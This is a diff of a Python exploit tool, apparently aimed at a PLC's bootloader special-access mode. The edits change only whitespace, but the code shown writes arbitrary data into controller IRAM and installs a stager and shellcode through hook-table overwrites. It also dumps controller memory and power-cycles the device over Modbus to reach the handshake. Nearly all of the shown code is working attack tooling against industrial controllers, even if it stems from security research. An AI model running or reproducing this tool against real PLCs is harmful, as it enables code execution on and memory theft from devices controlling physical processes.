@@ -92,7 +92,7 @@ class PayloadManager(object):
             self.next_payload_location += shellcode_len
             while self.next_payload_location % 4 != 0:
                 self.next_payload_location += 1
-
+    
     def get_next_payload_location(self):
         return self.next_payload_location
 
@@ -225,7 +225,7 @@ class PLCInterface(object):
         assert(len(contents)+8 <= MAX_MSG_LEN)
         assert(0x10000000 <= tar)
         assert(tar + len(contents) <= 0x10800000)
-
+        
         if not already_in_80_handler:
             answ = self._enter_subproto_handler(SUBPROT_80_MODE_IRAM)
             if answ != ANSW_ENTER_SUBPROTO_SUCCESS:
@@ -234,7 +234,7 @@ class PLCInterface(object):
         target_argument = tar-0x10000000
         # First write with FF pattern (seems to be a quirk or requirement)
         self._raw_subproto_write(target_argument, b'\xff' * len(contents), True)
-
+        
         # Actual content write
         # Handle potential issue with null bytes or specific patterns if needed, as in original
         if len(contents) == 4 and (contents[:2] in [b'\x00\x00', b'\x0a\x00'] or contents[2:4] in [b'\x00\x00', b'\x0a\x00']):
@@ -242,7 +242,7 @@ class PLCInterface(object):
             self._raw_subproto_write(target_argument+2, contents[2:4], True)
         else:
             self._raw_subproto_write(target_argument, contents, True)
-
+        
         if not already_in_80_handler:
             self._leave_subproto_handler()
         return True # Simplified, original returned answ
@@ -250,22 +250,22 @@ class PLCInterface(object):
     def exploit_write_to_iram(self, tar, contents):
         assert(len(contents) % 2 == 0)
         assert(0x10000000 <= tar and tar + len(contents) <= 0x10800000)
-
+        
         answ = self._enter_subproto_handler(SUBPROT_80_MODE_IRAM)
         if answ != ANSW_ENTER_SUBPROTO_SUCCESS:
             raise RuntimeError(f"Failed to enter IRAM subprotocol for multi-chunk write: {answ}")
-
+        
         if len(contents) % 4 == 2: # Handle unaligned start if necessary
             self._exploit_write_chunk_to_iram(tar, contents[:2], True)
             tar += 2
             contents = contents[2:]
-
+            
         chunk_size = 16 # As in original
         for i in range(0, len(contents), chunk_size):
             logger.debug(f"Writing {i:04x}/{len(contents):04x}")
             chunk = contents[i:i+chunk_size]
             self._exploit_write_chunk_to_iram(tar+i, chunk, True) # already_in_80_handler is True
-
+            
         self._leave_subproto_handler()
         return True # Simplified
 
@@ -360,9 +360,9 @@ class PLCInterface(object):
     def install_payload_via_stager(self, payload_shellcode_bytes, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
         if self.stager_addhook_ind is None:
             raise RuntimeError("Stager must be installed first.")
-
+        
         tar_addr = self.payload_manager.get_next_payload_location()
-
+        
         # Write the payload's entry into the hook table first
         # Entry: [flags/len (2B)][func_ptr (4B)][checksum/unused (2B)]
         # We need to set the function pointer and appropriate flags.
@@ -373,10 +373,10 @@ class PLCInterface(object):
         # The important part is that it writes the full 8-byte entry.
         hook_entry_data = b'\x00\x00\x00\xff' + struct.pack(">I", tar_addr) # Replicating original
         self._write_via_stager_internal(ADD_HOOK_TABLE_START + 8 * add_hook_no, hook_entry_data, self.stager_addhook_ind)
-
+        
         # Then write the actual shellcode
         self._write_via_stager_internal(tar_addr, payload_shellcode_bytes, self.stager_addhook_ind)
-
+        
         self.payload_manager.update_next_payload_location(tar_addr, len(payload_shellcode_bytes))
         logger.info(f"Payload installed at 0x{tar_addr:08x} using hook {add_hook_no} (via stager hook {self.stager_addhook_ind}).")
         return add_hook_no
@@ -389,7 +389,7 @@ class PLCInterface(object):
             # Here, we'll proceed assuming it might be handled by a prior call or is already there.
 
         dump_payload_hook_index = self.install_payload_via_stager(
-            dump_payload_shellcode_bytes,
+            dump_payload_shellcode_bytes, 
             DEFAULT_SECOND_ADD_HOOK_IND # Use a dedicated hook for the dump payload
         )
 
@@ -397,17 +397,17 @@ class PLCInterface(object):
         # Payload expects 'A' + address (4B) + length (4B)
         args_for_dump = b'A' + struct.pack(">II", dump_address, num_bytes_to_dump)
         answ = self.invoke_add_hook(dump_payload_hook_index, args_for_dump)
-
+        
         if answ is None or not answ.startswith(b'Ok'):
             raise RuntimeError(f"Dump command failed or unexpected response: {answ}")
 
         log.debug(f"[payload_dump_mem] answ (len: {len(answ)}): {answ}")
-
+        
         # This part needs to be a generator for GUI
         full_dump_data = b""
         received_bytes = 0
         start_time = time.time()
-
+        
         # Yield initial progress before starting the loop
         if self.progress_callback:
             self.progress_callback(0, num_bytes_to_dump, 0, 0, 0) # done, total, speed, elapsed, eta
@@ -421,10 +421,10 @@ class PLCInterface(object):
                 if received_bytes < num_bytes_to_dump:
                     logger.warning(f"Dump ended prematurely. Expected {num_bytes_to_dump}, got {received_bytes}")
                 break
-
+            
             full_dump_data += next_chunk
             received_bytes = len(full_dump_data)
-
+            
             if self.progress_callback:
                 now = time.time()
                 elapsed = now - start_time
@@ -436,7 +436,7 @@ class PLCInterface(object):
                 # Simplified logging for non-GUI use if needed
                 if received_bytes % (1024 * 10) == 0: # Log every 10KB
                      logger.info(f"Dump progress: {_format_bytes(received_bytes)} / {_format_bytes(num_bytes_to_dump)}")
-
+        
         logger.info(f"Dump completed. Received {_format_bytes(len(full_dump_data))}.")
         return full_dump_data
 
@@ -447,7 +447,7 @@ class PLCInterface(object):
         handshake_received = False
         handshake_start_time = time.time()
         greeting_message = None
-
+        
         # Try sending handshake for a short period (e.g., 2 seconds as in original)
         while not handshake_received and (time.time() - handshake_start_time) < 2.0:
             logger.debug(f"Sending handshake: {pad + magic}")
@@ -479,13 +479,13 @@ class PLCInterface(object):
                 logger.info(f"[+] Got special access greeting packet: {first_packet} [{hexlify(first_packet)}]")
                 greeting_message = first_packet # This is the actual first message like "-CPU"
                 handshake_received = True
-                break
+                break 
             time.sleep(0.05) # Wait a bit before retrying
 
         if not handshake_received:
             logger.error("[!] Handshake timeout: did not receive special access greeting.")
             return False, "Timeout"
-
+        
         return True, greeting_message
 
 
@@ -526,17 +526,17 @@ def main_cli():
                         help='Switch the power adapter on and off before connecting')
     common_group.add_argument('--powersupply-delay', dest='powersupply_delay', default=1000, type=lambda x: int(x, 0),
                         help="Number of milliseconds to wait between power off and on (default: 1000ms).")
-    common_group.add_argument('-s', '--stager', dest="stager_file", type=argparse.FileType('rb'),
+    common_group.add_argument('-s', '--stager', dest="stager_file", type=argparse.FileType('rb'), 
                         default=STAGER_PL_FILENAME, help=f'Location of the stager payload (default: {STAGER_PL_FILENAME})')
-    common_group.add_argument('-c', '--continue-plc', dest='continue_plc', default=False, action='store_true',
+    common_group.add_argument('-c', '--continue-plc', dest='continue_plc', default=False, action='store_true', 
                         help="Send 'bye' command to continue PLC execution after action; otherwise waits for input.")
 
     modbus_group = parser.add_argument_group('Modbus TCP arguments (for --switch-power)')
-    modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18',
+    modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18', 
                         help='Modbus TCP IP address (default: 192.168.1.18)')
-    modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0),
+    modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0), 
                         help='Modbus TCP port (default: 502)')
-    modbus_group.add_argument('--modbus-output', dest='modbus_output', type=int,
+    modbus_group.add_argument('--modbus-output', dest='modbus_output', type=int, 
                         help='Modbus output/channel to control (required if --switch-power is used)')
 
     subparsers = parser.add_subparsers(dest="action", help="Action to perform") # Removed required=True for Python 3.6 compatibility
@@ -558,18 +558,18 @@ def main_cli():
 
 
     parser_dump = subparsers.add_parser(ACTION_DUMP, help="Dump memory from the PLC.")
-    parser_dump.add_argument('--address', dest="address", type=lambda x: int(x, 0), required=True,
+    parser_dump.add_argument('--address', dest="address", type=lambda x: int(x, 0), required=True, 
                         help="Start address for memory dump (e.g., 0x10010100).")
-    parser_dump.add_argument('--length', dest="length", type=lambda x: int(x, 0), required=True,
+    parser_dump.add_argument('--length', dest="length", type=lambda x: int(x, 0), required=True, 
                         help="Number of bytes to dump.")
-    parser_dump.add_argument('--dump-payload', dest='dump_payload_file', type=argparse.FileType('rb'),
+    parser_dump.add_argument('--dump-payload', dest='dump_payload_file', type=argparse.FileType('rb'), 
                         default=DUMPMEM_PL_FILENAME, help=f"Payload for dumping memory (default: {DUMPMEM_PL_FILENAME})")
-    parser_dump.add_argument('-o', '--out-file', dest='outfile_name',
+    parser_dump.add_argument('-o', '--out-file', dest='outfile_name', 
                         default=None, help="Name of file to store the dump (default: mem_dump_ADDR_LEN.bin).")
 
     # Simplified test action for CLI
     parser_test_action = subparsers.add_parser(ACTION_TEST, help="Run a simple test (e.g., get version, install test payload).")
-    parser_test_action.add_argument('--test-payload', dest="test_payload_file", type=argparse.FileType('rb'),
+    parser_test_action.add_argument('--test-payload', dest="test_payload_file", type=argparse.FileType('rb'), 
                                    default="payloads/hello_world/hello_world.bin", help="Test payload to execute.")
 
     args = parser.parse_args()
@@ -578,20 +578,20 @@ def main_cli():
     if args.switch_power:
         if args.modbus_output is None:
             parser.error("--modbus-output is required when --switch-power is used.")
-
+        
         logger.info(f"Turning OFF power supply (Output: {args.modbus_output} at {args.modbus_ip}:{args.modbus_port})...")
         if not switch_power('off', args.modbus_ip, args.modbus_port, args.modbus_output):
             logger.error("Failed to turn off power supply. Aborting.")
             sys.exit(1)
-
+        
         logger.info(f"Waiting for {args.powersupply_delay}ms...")
         time.sleep(args.powersupply_delay / 1000.0)
-
+        
         logger.info(f"Turning ON power supply (Output: {args.modbus_output} at {args.modbus_ip}:{args.modbus_port})...")
         if not switch_power('on', args.modbus_ip, args.modbus_port, args.modbus_output):
             logger.error("Failed to turn on power supply. Aborting.")
             sys.exit(1)
-
+        
         # Add a small fixed delay after power ON before attempting connection,
         # as PLC bootloader might take a moment.
         # The handshake itself has a 2-second window.
@@ -643,16 +643,16 @@ def main_cli():
         if args.action == ACTION_DUMP:
             dump_payload_code = args.dump_payload_file.read()
             args.dump_payload_file.close()
-
+            
             out_filename = args.outfile_name
             if not out_filename:
                 out_filename = f"mem_dump_{args.address:08x}_{args.address + args.length:08x}.bin"
 
             logger.info(f"Starting memory dump: Address=0x{args.address:08x}, Length={args.length} bytes.")
             logger.info(f"Using dump payload: {args.dump_payload_file.name} ({len(dump_payload_code)} bytes)")
-
+            
             dumped_data = plc.execute_memory_dump(dump_payload_code, args.address, args.length)
-
+            
             with open(out_filename, "wb") as f:
                 f.write(dumped_data)
             logger.info(f"Memory dump saved to {out_filename} ({len(dumped_data)} bytes written).")
@@ -660,14 +660,14 @@ def main_cli():
         elif args.action == ACTION_INVOKE_HOOK:
             payload_code = args.payload_file.read()
             args.payload_file.close()
-
+            
             logger.info(f"Installing payload '{args.payload_file.name}' ({len(payload_code)} bytes) to hook {args.hook_index}...")
             installed_hook_idx = plc.install_payload_via_stager(payload_code, add_hook_no=args.hook_index)
-
+            
             logger.info(f"Invoking payload hook {installed_hook_idx} with args: '{args.payload_args.decode(errors='replace')}' "
                         f"(await_response={args.await_response})...")
             response = plc.invoke_add_hook(installed_hook_idx, args.payload_args, await_response=args.await_response)
-
+            
             if args.await_response:
                 if response is not None:
                     logger.info(f"Response from payload: {response} ({hexlify(response)})")
@@ -697,7 +697,7 @@ def main_cli():
             else:
                 logger.warning("No response from test payload.")
             logger.info("Test action completed.")
-
+            
         # Add other actions (TIC_TAC_TOE, HELLO_LOOP) here if desired for CLI
         # For now, they were more complex interaction-wise in the original script.
 
